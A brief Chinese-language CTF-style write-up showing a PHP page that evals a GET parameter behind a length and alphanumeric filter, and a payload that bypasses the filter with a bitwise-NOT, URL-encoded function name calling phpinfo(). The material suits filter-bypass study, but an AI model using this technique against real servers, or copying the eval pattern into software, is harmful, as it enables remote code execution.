## URL 编码取反加 ~ 绕过

打开网页给出了源码

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
```

我们将 php 代码 URL 编码后取反，我们传入参数后服务端进行 URL 解码

这时由于取反后，会 URL 解码成不可打印字符，这样我们就会绕过

即，对查询语句取反，然后编码

在编码前加上 ~ 进行取反，括号没有被过滤，不用取反

```php
//?code=phpinfo();
?code=(~%8F%97%8F%96%91%99%90)();
```
